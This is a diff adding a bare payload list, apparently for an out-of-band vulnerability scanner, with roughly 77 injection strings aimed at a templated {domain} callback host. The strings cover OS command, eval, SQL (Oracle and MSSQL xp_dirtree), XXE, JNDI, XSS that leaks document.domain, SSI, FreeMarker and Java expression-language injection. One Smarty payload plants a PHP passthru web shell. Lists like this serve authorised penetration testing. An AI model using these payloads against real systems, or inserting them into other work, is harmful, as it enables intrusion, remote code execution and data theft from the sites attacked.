@@ -1,0 +1,77 @@
+nslookup {domain}&
+`nslookup {domain}`
+|nslookup {domain}&
+'"`0&nslookup {domain}&`'
+&nslookup -q=cname {domain}&'\"`0&nslookup {domain}&`'
++eval("require'socket'\nSocket.gethostbyname('{domain}')")+'
+eval("require'socket'\nSocket.gethostbyname('{domain}')")
+"+eval("require'socket'\nSocket.gethostbyname('{domain}')")+"
+'+eval(compile('for x in range(1):\n import socket\n socket.gethostbyname("{domain}")','a','single'))+'
+eval(compile('for x in range(1):\n import socket\n socket.gethostbyname("{domain}")','a','single'))
+gethostbyname('{domain}')
+'.gethostbyname('{domain}').'
+'.gethostbyname("{domain}").'
+{${gethostbyname("{domain}")}}
+require('child_process').exec('nslookup {domain}')
+'-require('child_process').exec('nslookup {domain}')-'
+"-require("child_process").exec("nslookup {domain}")-"
+<% require('child_process').exec('nslookup {domain}'); %>
+<% require("child_process").exec("nslookup {domain}"); %>
+||UTL_INADDR.get_host_address('{domain}')
+'||UTL_INADDR.get_host_address('{domain}')||'
+||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{domain}/ext1">%xxx;]>'),'/l')
+'||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{domain}/ext2">%xxx;]>'),'/l')||'
+UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING({domain}))
+ or chr(1)=UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING({domain}))
+extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{domain}/ext3">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+ or chr(1)=extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{domain}/ext4">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+(select load_file('\\\\{domain}\\c'))
+'+(select load_file('\\\\{domain}\\e'))+'
+;EXEC master..xp_dirtree '\\{domain}\s'--
+1;EXEC master..xp_dirtree '\\{domain}\s'--
+';EXEC master..xp_dirtree '\\{domain}\s'--    
+');EXEC master..xp_dirtree '\\{domain}\s'--
+;EXEC master..xp_dirtree "\\{domain}\s"--
+1;EXEC master..xp_dirtree "\\{domain}\s"--
+";EXEC master..xp_dirtree "\\{domain}\s"--
+");EXEC master..xp_dirtree "\\{domain}\s"--
+"='';EXEC master..xp_dirtree "\\{domain}\s"--
+"='');EXEC master..xp_dirtree "\\{domain}\s"--
+;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+1;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+");DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+"='';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+"='');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+\';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+\";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+rmi://{domain}/go
+ldap://{domain}/cn=bar,dc=test,dc=org
+" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://{domain}/x.xsd
+<a xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://{domain}/x.xsd"><b></b></a>
+<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{domain}/xincl"></xi:include></data>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE a SYSTEM "http://{domain}/xxx"><a></a>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE x [<!ENTITY % xx SYSTEM "http://{domain}/xxx">%xx;]><a></a>
+*/--></script></title></textarea></noscript></style></xmp></noembed></comment></noframes></xml></iframe>"'><script>document.write('<img src=//{domain}/'+document.domain+'>')</script>
+*/--></script></title></textarea></noscript></style></xmp></noembed></comment></noframes></xml></iframe>"'><img src="//{domain}/image.jpg">
+"-->'-->`--><!--#set var="suc" value="rtb97y3o64"--><!--#set var="uwe" value="tvdb905q86"--><!--#echo var="suc"--><!--#echo var="uwe"--><!--#exec cmd="nslookup {domain}" -->
+javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/rkf9yyuox44dahzjkookgz001r7ovej6au1koaczX;.{domain}/).replace(/.;/g,[])]//'src=>
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("nslookup {domain}") }
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['nslookup {domain}']); ?>",self::clearConfig())}
+{domain}
+http://{domain}
+https://{domain}
+%20{!xmlparser v='<!DOCTYPE a SYSTEM "http://{domain}/sr"><a></a>'}%20
+" {!xmlparser v='<!DOCTYPE a SYSTEM "http://{domain}/sr"><a></a>'} "
+") {!xmlparser v='<!DOCTYPE a SYSTEM "http://{domain}/sr"><a></a>'} ("
+&shards={domain}/sr
+#{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup {domain}\"]).start()")}
+}#{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup {domain}\"]).start()")}#{
+#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup {domain}\']).start()')}
+}#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup {domain}\']).start()')}#{
+${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup {domain}\"]).start()")}
+}${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup {domain}\"]).start()")}${
+${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup {domain}\']).start()')}
+}${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup {domain}\']).start()')}${
